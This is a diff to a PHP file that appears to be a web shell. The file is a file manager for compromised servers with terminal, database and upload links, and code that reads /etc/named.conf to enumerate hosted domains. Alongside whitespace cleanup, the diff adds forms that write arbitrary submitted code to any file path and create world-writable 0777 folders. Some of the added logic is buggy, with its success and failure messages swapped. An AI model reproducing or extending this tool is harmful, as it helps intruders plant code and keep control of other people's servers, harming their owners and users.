@@ -168,7 +168,7 @@ if (!isset($_SESSION['login'])) {
 		padding: 10px;
 	}
 	select:hover,
-	#alertBox #closeBtn:hover, 
+	#alertBox #closeBtn:hover,
 	div.tool a:hover,
 	input[type=submit]:hover {
 		cursor: pointer;
@@ -222,7 +222,7 @@ if (!isset($_SESSION['login'])) {
 		border-spacing:0;
 	}
 	.hover:hover {
-		background: var(--color-bg); 
+		background: var(--color-bg);
 	}
 	div.dir, div.file {
 		padding:1px;
@@ -272,8 +272,9 @@ if (!isset($_SESSION['login'])) {
 	}
 	div.edit,
 	div.upload,
-	div.createfile, 
-	div.chname, 
+	div.createfile,
+	div.chname,
+	div.addfiles,
 	div.preview,
 	div.infos,
 	div.make {
@@ -282,6 +283,7 @@ if (!isset($_SESSION['login'])) {
 	div.createfile,
 	div.upload,
 	div.chname,
+	div.addfiles,
 	div.preview,
 	div.infos,
 	div.edit {
@@ -294,7 +296,7 @@ if (!isset($_SESSION['login'])) {
 		box-shadow: 0 0px 1.5px rgba(0,0,0,0.15), 0 0px 1.5px rgba(0,0,0,0.16);
 	}
 	div.upload {
-		height:500px;
+		height:490px;
 		overflow: hidden;
 	}
 	div.infos {
@@ -340,35 +342,35 @@ if (!isset($_SESSION['login'])) {
 		font-weight: bold;
 		text-align: left;
 	}
-	.block { 
-		clear: both;  
-		min-height: 50px; 
-		border-top: solid 1px #ECE9E9; 
+	.block {
+		clear: both;
+		min-height: 50px;
+		border-top: solid 1px #ECE9E9;
 	}
-    .block:first-child { 
+    .block:first-child {
     	border: none;
     }
     .block .img img {
-    	width: 50px; 
-    	height: 50px; 
-    	display: block; 
-    	float: left; 
+    	width: 50px;
+    	height: 50px;
+    	display: block;
+    	float: left;
     	margin-right: 10px;
     }
-    .block .date { 
-    	margin-top: 4px; 
-    	font-size: 70%; 
-    	color: #666; 
+    .block .date {
+    	margin-top: 4px;
+    	font-size: 70%;
+    	color: #666;
     }
-    .block a { 
+    .block a {
     	border-radius:5px;
-    	display: block; 
-    	padding: 10px 15px; 
+    	display: block;
+    	padding: 10px 15px;
     	transition: all 0.35s;
     }
-    .block a:hover { 
-    	text-decoration: none; 
-    	background: #efefef; 
+    .block a:hover {
+    	text-decoration: none;
+    	background: #efefef;
     }
 	textarea {
 		border: 1px solid #f2f2f2;
@@ -424,7 +426,8 @@ if (!isset($_SESSION['login'])) {
 	table.upload td,
 	table.infos td,
 	table.createfile td,
-	table.chname td, 
+	table.chname td,
+	table.addfiles td,
 	table.preview td,
 	table.edit td {
 		padding:7px;
@@ -668,7 +671,7 @@ if (!isset($_SESSION['login'])) {
 	font-size: 18px;
 	outline: none;
 	background: none;
-	padding:10px; 
+	padding:10px;
 }
 .modal button:hover {
 	cursor: pointer;
@@ -902,7 +905,7 @@ if (!isset($_SESSION['login'])) {
 	title = "-/-\\--";
 	position = 0;
 	function scrolltitle() {
-		document.title = title.substring(position, title.length) + title.substring(0, position); 
+		document.title = title.substring(position, title.length) + title.substring(0, position);
 		position++;
 		if (position > title.length) position = 0;
 		titleScroll = window.setTimeout(scrolltitle,170);
@@ -990,7 +993,11 @@ function myFunction() {
 			</a>
 			<a href="?cd=<?= $_GET['cd'] ?>&x=make">
 				<i class="fa fa-plus-square" aria-hidden="true"></i>
-				<span>Add File</span>
+				<span>Add Files</span>
+			</a>
+			<a href="cd=<?= $_GET['cd'] ?>">
+				<i class="fa fa-folder" aria-hidden="true"></i>
+				<span>Add Folder</span>
 			</a>
 			<a href="?cd=<?= $_GET['cd'] ?>&coomingsoong">
 				<i class="fa fa-exclamation-triangle"></i>
@@ -1044,7 +1051,7 @@ function myFunction() {
 				}
 				$file['link']	= self::hex($file['name']);
 				$file['size'] 	= (is_dir($file['name'])) ? self::countDir($file['name']). " items" : x::size($file['name']);
-				$file['perms'] 	= x::w__($file['name'], x::perms($file['name'])); 
+				$file['perms'] 	= x::w__($file['name'], x::perms($file['name']));
 				$result[] = $file;
 			} return $result;
 		}
@@ -1056,7 +1063,7 @@ function myFunction() {
 						break;
 				}
 			}
-			
+
 		}
 		public static function save($filename = null, $data, $type) {
 			switch ($type) {
@@ -1152,7 +1159,7 @@ function myFunction() {
 				} if ($value == '') continue;
 				self::$result .= "<a class='pwd' href='?cd=";
 				self::$link = '';
-				for ($i=0; $i < $key ; $i++) { 
+				for ($i=0; $i < $key ; $i++) {
 					self::$link .= self::$path[$i];
 					if ($i != $key) self::$link .= DIRECTORY_SEPARATOR;
 				}
@@ -1211,7 +1218,7 @@ function myFunction() {
     				if (!$d0mains){
     					print "<font color=red size=2px>Cant Read <i>/etc/named.conf</i></font>";
     					$GLOBALS["need_to_update_header"] = "true";
-    				} else { 
+    				} else {
     					$count = 0;
     					foreach ($d0mains as $d0main){
     						if (@strstr($d0main, "zone")){
@@ -1227,6 +1234,14 @@ function myFunction() {
     				}
     			break;
     		}
+    	}
+    	public static function addfiles($filename, $data) {
+    		self::$handle = fopen($filename, "w");
+    		fwrite(self::$handle, $data);
+    		fclose(self::$handle);
+    	}
+    	public static function addfolder($dirname) {
+    		return mkdir($dirname, 0777);
     	}
     	public static function delete($filename) {
     		if (is_dir($filename)) {
@@ -1460,6 +1475,18 @@ function myFunction() {
 				<i class="fa fa-terminal" aria-hidden="true"></i>
 				<span>Terminal</span>
 			</a>
+			<a href="?cd=<?= $_GET['cd'] ?>&addfiles">
+				<i class="fa fa-plus-square" aria-hidden="true"></i>
+				<span>Add File</span>
+			</a>
+			<a href="?cd=<?= $_GET['cd'] ?>&addfolder">
+				<i class="fa fa-folder" aria-hidden="true"></i>
+				<span>Add Folder</span>
+			</a>
+			<a href="?cd=<?= $_GET['cd'] ?>&upload">
+				<i class="fa fa-upload"></i>
+				<span>Upload</span>
+			</a>
 			<a href="?cd=<?= $_GET['cd'] ?>&coomingsoong">
 				<i class="fa fa-cogs"></i>
 				<span>Config</span>
@@ -1467,10 +1494,6 @@ function myFunction() {
 			<a href="?cd=<?= x::hex(x::cwd()) ?>&adminer">
 				<i class="fa fa-user"></i>
 				<span>Adminer</span>
-			</a>
-			<a href="?cd=<?= $_GET['cd'] ?>&upload">
-				<i class="fa fa-upload"></i>
-				<span>Upload</span>
 			</a>
 			<a href="?cd=<?= $_GET['cd'] ?>&coomingsoong">
 				<i class="fa fa-exclamation-triangle"></i>
@@ -1483,10 +1506,6 @@ function myFunction() {
 			<a href="?cd=<?= $_GET['cd'] ?>&coomingsoong">
 				<i class="fas fa-network-wired"></i>
 				<span>Network</span>
-			</a>
-			<a href="?cd=<?= $_GET['cd'] ?>&x=make">
-				<i class="fa fa-plus-square" aria-hidden="true"></i>
-				<span>Add File</span>
 			</a>
 			<a href="?cd=<?= $_GET['cd'] ?>&coomingsoong">
 				<i class="fa fa-exclamation-triangle"></i>
@@ -1517,7 +1536,7 @@ function myFunction() {
 						case 'delete':
 							print($filename);
 							break;
-						
+
 						default:
 							# code...
 							break;
@@ -1582,7 +1601,7 @@ function myFunction() {
 						);
 				} else {
 					print("<script>alert('permission danied')</script>");
-				} 
+				}
 			}
 			if (isset($_GET['coomingsoong'])) {
 				print("<script>alert('<h2>Cooming Soon</h2>')</script>");
@@ -1633,7 +1652,7 @@ function myFunction() {
 										</td>
 										<td>:</td>
 										<td>
-											<?= filetype($_POST['file']) ?>  
+											<?= filetype($_POST['file']) ?>
 											<i><?= x::countDir($_POST['file']) ?> items</i>
 										</td>
 									</tr>
@@ -1875,7 +1894,7 @@ function myFunction() {
 				foreach (x::files('dir') as $dir) {
 					$dirs = basename($dir['name']);
 					if (strlen($dirs) > 29){
-						$_dir = substr($dirs, 0, 29)."...";		
+						$_dir = substr($dirs, 0, 29)."...";
 					} else {
 						$_dir = $dirs;
 					}
@@ -1908,7 +1927,7 @@ function myFunction() {
 					$rp = str_replace('.', '', basename($file['name']));
 					$files = basename($file['name']);
 					if (strlen($files) > 30){
-						$_file = substr($files, 0, 30)."...";		
+						$_file = substr($files, 0, 30)."...";
 					} else {
 						$_file = $files;
 					}
@@ -1916,8 +1935,8 @@ function myFunction() {
 						<tr>
 							<td class="files">
 								<div class="block">
-									<a  href="#<?= $rp ?>" 
-										data-modal='#action<?= $rp ?>' 
+									<a  href="#<?= $rp ?>"
+										data-modal='#action<?= $rp ?>'
 										title='<?= basename($file['name']) ?>'>
 										<div class="img">
 											<img src="<?= x::getimg($file['name']) ?>">
@@ -1995,6 +2014,82 @@ function myFunction() {
 </div>
 <div class="col-xs-5 center">
 	<?php
+	if (isset($_GET['addfolder'])) {
+		if (isset($_POST['submit'])) {
+			if (x::addfolder($_POST['dirname'])) {
+				print("<script>alert('Folder <b><i>".$_POST['dirname']."</i></b>&nbsp;&nbsp; Added !')</script>");
+				print("<script>alert('permission danied')</script>");
+			} else {
+				print("<script>alert('permission danied')</script>");	
+			}
+		}
+		?>
+		<div class="addfiles">
+			<table width="100%" class="addfiles">
+				<tr>
+					<td class="action" colspan="3">
+						<center>
+							<span><i class="fa fa-folder"></i> ADD FOLDER</span>
+						</center>
+					</td>
+				</tr>
+				<form method="post">
+					<tr>
+						<td>
+							<input type="text" name="dirname" placeholder="untitle">
+						</td>
+					</tr>
+					<tr>
+						<td>
+							<input type="submit" name="submit" value="Add">
+						</td>
+					</tr>
+				</form>
+			</table>
+		</div>
+		<?php
+		exit();
+	}
+	if (isset($_GET['addfiles'])) {
+		if (isset($_POST['submit'])) {
+			if (x::addfiles($_POST['filename'], $_POST['data'])) {
+				print("<script>alert('permission danied')</script>");
+			} else {
+				print("<script>alert('File <b><i>".$_POST['filename']."</i></b>&nbsp;&nbsp; Added !')</script>");
+			}
+		}
+		?>
+		<div class="addfiles">
+			<table width="100%" class="addfiles">
+				<tr>
+					<td class="action" colspan="3">
+						<center>
+							<i class="fa fa-plus-square" aria-hidden="true"></i> ADD FILES</span>
+						</center>
+					</td>
+				</tr>
+				<form method="post">
+					<tr>
+						<td>
+							<input type="text" name="filename" placeholder="untitle.php">
+						</td>
+					</tr>
+					<tr>
+						<td>
+							<textarea name="data" placeholder="your code"></textarea>
+						</td>
+					</tr>
+					<tr>
+						<td>
+							<input type="submit" name="submit" value="Add">
+						</td>
+					</tr>
+				</form>
+			</table>
+		</div>
+		<?php
+		exit();
+	}
 	if (isset($_GET['upload'])) {
 		?>
 		<div class="upload">
@@ -2009,10 +2104,10 @@ function myFunction() {
 						<td>
 							<div id="upload" onclick="getFile()">CHOOSE FILE</div>
 							<div style='height: 0px;width: 0px; overflow:hidden;'>
-								<input 
-									id="upfile" 
-									type="file" 
-									name="file[]" 
+								<input
+									id="upfile"
+									type="file"
+									name="file[]"
 									onchange="javascript:updateList()" multiple>
 							</div>
 						</td>
@@ -2032,15 +2127,15 @@ function myFunction() {
 					<?php
 					if (isset($_POST['upload'])) {
 						$files = count($_FILES['file']['tmp_name']);
-						for ($i=0; $i < $files ; $i++) { 
+						for ($i=0; $i < $files ; $i++) {
 							if (copy($_FILES['file']['tmp_name'][$i] , x::unhex($_GET['cd']). DIRECTORY_SEPARATOR .$_FILES['file']['name'][$i])) { ?>
 								<tr>
 									<td colspan="2">
 										<div class="alert">
 											<div class="success">
-												<img src="<?= x::getimg($_FILES['file']['name'][$i]) ?>" class='icons'> 
+												<img src="<?= x::getimg($_FILES['file']['name'][$i]) ?>" class='icons'>
 												<a href="?cd=<?= $_GET['cd'] ?>&preview=<?= x::hex($_FILES['file']['name'][$i]) ?>">
-													<?= $_FILES['file']['name'][$i] ?>	
+													<?= $_FILES['file']['name'][$i] ?>
 												</a>
 												<span>Uploaded !</span>
 											</div>
